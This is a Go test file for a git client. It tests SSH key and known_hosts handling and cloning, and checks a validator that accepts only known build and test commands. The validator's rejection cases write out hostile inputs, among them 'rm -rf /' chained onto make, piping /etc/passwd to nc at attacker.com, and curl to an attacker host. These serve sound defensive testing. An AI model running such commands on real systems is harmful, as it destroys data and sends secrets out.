/*
Copyright 2026.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package git

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

// skipIfNoGit skips the test if git is not available
func skipIfNoGit(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available, skipping test")
	}
}

func TestNewClient(t *testing.T) {
	client := NewClient("/tmp/repo", "https://github.com/example/repo.git")

	if client.RepoDir != "/tmp/repo" {
		t.Errorf("RepoDir = %s, want /tmp/repo", client.RepoDir)
	}

	if client.GitURL != "https://github.com/example/repo.git" {
		t.Errorf("GitURL = %s, want https://github.com/example/repo.git", client.GitURL)
	}
}

func TestWithSSHKey(t *testing.T) {
	client := NewClient("/tmp/repo", "git@github.com:example/repo.git")
	client = client.WithSSHKey("/path/to/key")

	if client.SSHKeyPath != "/path/to/key" {
		t.Errorf("SSHKeyPath = %s, want /path/to/key", client.SSHKeyPath)
	}
}

func TestEnsureKnownHosts(t *testing.T) {
	client := NewClient("/tmp/repo", "git@github.com:example/repo.git")
	client = client.WithSSHKey("/path/to/key")
	defer client.Cleanup()

	// First call should create the file
	path1, err := client.ensureKnownHosts()
	if err != nil {
		t.Fatalf("ensureKnownHosts failed: %v", err)
	}

	if path1 == "" {
		t.Error("Expected non-empty known_hosts path")
	}

	// Verify file exists and contains expected content
	content, err := os.ReadFile(path1)
	if err != nil {
		t.Fatalf("Failed to read known_hosts file: %v", err)
	}

	// Should contain GitHub host key
	if !contains(string(content), "github.com") {
		t.Error("known_hosts should contain github.com")
	}

	// Should contain GitLab host key
	if !contains(string(content), "gitlab.com") {
		t.Error("known_hosts should contain gitlab.com")
	}

	// Should contain Bitbucket host key
	if !contains(string(content), "bitbucket.org") {
		t.Error("known_hosts should contain bitbucket.org")
	}

	// Second call should return same path (cached)
	path2, err := client.ensureKnownHosts()
	if err != nil {
		t.Fatalf("Second ensureKnownHosts call failed: %v", err)
	}

	if path1 != path2 {
		t.Errorf("Expected cached path %s, got %s", path1, path2)
	}
}

func TestBuildSSHCommand(t *testing.T) {
	t.Run("without SSH key returns empty", func(t *testing.T) {
		client := NewClient("/tmp/repo", "git@github.com:example/repo.git")

		cmd, err := client.buildSSHCommand()
		if err != nil {
			t.Fatalf("buildSSHCommand failed: %v", err)
		}

		if cmd != "" {
			t.Errorf("Expected empty command when no SSH key, got: %s", cmd)
		}
	})

	t.Run("with SSH key builds secure command", func(t *testing.T) {
		client := NewClient("/tmp/repo", "git@github.com:example/repo.git")
		client = client.WithSSHKey("/path/to/key")
		defer client.Cleanup()

		cmd, err := client.buildSSHCommand()
		if err != nil {
			t.Fatalf("buildSSHCommand failed: %v", err)
		}

		// Should include the SSH key path
		if !contains(cmd, "-i /path/to/key") {
			t.Errorf("SSH command should include key path, got: %s", cmd)
		}

		// Should use StrictHostKeyChecking=yes (secure)
		if !contains(cmd, "StrictHostKeyChecking=yes") {
			t.Errorf("SSH command should use StrictHostKeyChecking=yes, got: %s", cmd)
		}

		// Should NOT use StrictHostKeyChecking=no (insecure)
		if contains(cmd, "StrictHostKeyChecking=no") {
			t.Errorf("SSH command should NOT use StrictHostKeyChecking=no, got: %s", cmd)
		}

		// Should specify a UserKnownHostsFile (not /dev/null)
		if contains(cmd, "UserKnownHostsFile=/dev/null") {
			t.Errorf("SSH command should NOT use UserKnownHostsFile=/dev/null, got: %s", cmd)
		}

		if !contains(cmd, "UserKnownHostsFile=") {
			t.Errorf("SSH command should specify UserKnownHostsFile, got: %s", cmd)
		}
	})
}

func TestCleanup(t *testing.T) {
	client := NewClient("/tmp/repo", "git@github.com:example/repo.git")
	client = client.WithSSHKey("/path/to/key")

	// Create known_hosts file
	path, err := client.ensureKnownHosts()
	if err != nil {
		t.Fatalf("ensureKnownHosts failed: %v", err)
	}

	// Verify file exists
	if _, err := os.Stat(path); err != nil {
		t.Fatalf("known_hosts file should exist: %v", err)
	}

	// Cleanup
	client.Cleanup()

	// File should be removed
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Error("known_hosts file should be removed after Cleanup")
	}

	// knownHostsPath should be reset
	if client.knownHostsPath != "" {
		t.Error("knownHostsPath should be empty after Cleanup")
	}
}

// contains checks if s contains substr
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsHelper(s, substr))
}

func containsHelper(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func TestClone(t *testing.T) {
	skipIfNoGit(t)

	// Create a temp "origin" repo
	originDir, err := os.MkdirTemp("", "git-test-origin-*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(originDir) }()

	// Initialize the origin repo
	ctx := context.Background()
	cmd := exec.CommandContext(ctx, "git", "init", "--bare")
	cmd.Dir = originDir
	if err := cmd.Run(); err != nil {
		t.Fatalf("Failed to init origin repo: %v", err)
	}

	// Create a clone directory
	cloneDir, err := os.MkdirTemp("", "git-test-clone-*")
	if err != nil {
		t.Fatalf("Failed to create clone dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(cloneDir) }()

	repoPath := filepath.Join(cloneDir, "repo")

	// Clone it
	client := NewClient(repoPath, originDir)
	if err := client.Clone(ctx); err != nil {
		t.Fatalf("Clone failed: %v", err)
	}

	// Verify the clone exists
	if _, err := os.Stat(filepath.Join(repoPath, ".git")); err != nil {
		t.Errorf("Clone directory doesn't have .git: %v", err)
	}
}

func TestIsClean(t *testing.T) {
	skipIfNoGit(t)

	// Create a temp repo
	repoDir, err := os.MkdirTemp("", "git-test-clean-*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(repoDir) }()

	ctx := context.Background()

	// Initialize repo
	cmd := exec.CommandContext(ctx, "git", "init")
	cmd.Dir = repoDir
	if err := cmd.Run(); err != nil {
		t.Fatalf("Failed to init repo: %v", err)
	}

	// Configure git user for commits
	cmd = exec.CommandContext(ctx, "git", "config", "user.email", "test@test.com")
	cmd.Dir = repoDir
	_ = cmd.Run()

	cmd = exec.CommandContext(ctx, "git", "config", "user.name", "Test User")
	cmd.Dir = repoDir
	_ = cmd.Run()

	client := NewClient(repoDir, "")

	// Empty repo should be clean
	clean, err := client.IsClean(ctx)
	if err != nil {
		t.Fatalf("IsClean failed: %v", err)
	}
	if !clean {
		t.Error("Expected empty repo to be clean")
	}

	// Add a file
	testFile := filepath.Join(repoDir, "test.txt")
	if err := os.WriteFile(testFile, []byte("hello"), 0o644); err != nil {
		t.Fatalf("Failed to write test file: %v", err)
	}

	// Now should not be clean
	clean, err = client.IsClean(ctx)
	if err != nil {
		t.Fatalf("IsClean failed: %v", err)
	}
	if clean {
		t.Error("Expected repo with untracked file to not be clean")
	}
}

func TestValidateTestCommand(t *testing.T) {
	tests := []struct {
		name      string
		command   string
		wantError bool
	}{
		// Valid commands - should pass
		{name: "empty command", command: "", wantError: false},
		{name: "make", command: "make", wantError: false},
		{name: "make test", command: "make test", wantError: false},
		{name: "make build", command: "make build", wantError: false},
		{name: "make with multiple targets", command: "make test build", wantError: false},
		{name: "go test", command: "go test", wantError: false},
		{name: "go test with flags", command: "go test ./...", wantError: false},
		{name: "go build", command: "go build ./...", wantError: false},
		{name: "go vet", command: "go vet ./...", wantError: false},
		{name: "npm test", command: "npm test", wantError: false},
		{name: "npm run test", command: "npm run test", wantError: false},
		{name: "yarn test", command: "yarn test", wantError: false},
		{name: "pytest", command: "pytest", wantError: false},
		{name: "pytest with args", command: "pytest -v", wantError: false},
		{name: "cargo test", command: "cargo test", wantError: false},
		{name: "cargo build", command: "cargo build", wantError: false},
		{name: "mvn test", command: "mvn test", wantError: false},
		{name: "mvn verify", command: "mvn verify", wantError: false},
		{name: "gradle test", command: "gradle test", wantError: false},
		{name: "gradle build", command: "gradle build", wantError: false},
		{name: "gradlew test", command: "./gradlew test", wantError: false},
		{name: "gradlew build", command: "./gradlew build", wantError: false},
		{name: "mvnw test", command: "./mvnw test", wantError: false},
		{name: "bazel test", command: "bazel test //...", wantError: false},

		// Invalid commands - should fail

		// Command chaining attempts
		{name: "semicolon injection", command: "make test; rm -rf /", wantError: true},
		{name: "and chaining", command: "make test && rm -rf /", wantError: true},
		{name: "or chaining", command: "make test || rm -rf /", wantError: true},

		// Pipe injection
		{name: "pipe injection", command: "cat /etc/passwd | nc attacker.com 1234", wantError: true},

		// Variable expansion
		{name: "variable expansion", command: "echo $HOME", wantError: true},
		{name: "command substitution backticks", command: "echo `whoami`", wantError: true},
		{name: "command substitution dollar", command: "echo $(whoami)", wantError: true},

		// Redirection
		{name: "output redirect", command: "ls > /tmp/output", wantError: true},
		{name: "input redirect", command: "cat < /etc/passwd", wantError: true},

		// Quote escaping
		{name: "single quote escape", command: "make test'", wantError: true},
		{name: "double quote escape", command: "make test\"", wantError: true},

		// Unknown commands
		{name: "arbitrary command", command: "curl http://attacker.com", wantError: true},
		{name: "rm command", command: "rm -rf /", wantError: true},
		{name: "bash command", command: "bash -c whoami", wantError: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateTestCommand(tt.command)
			if tt.wantError && err == nil {
				t.Errorf("ValidateTestCommand(%q) = nil, want error", tt.command)
			}
			if !tt.wantError && err != nil {
				t.Errorf("ValidateTestCommand(%q) = %v, want nil", tt.command, err)
			}
		})
	}
}
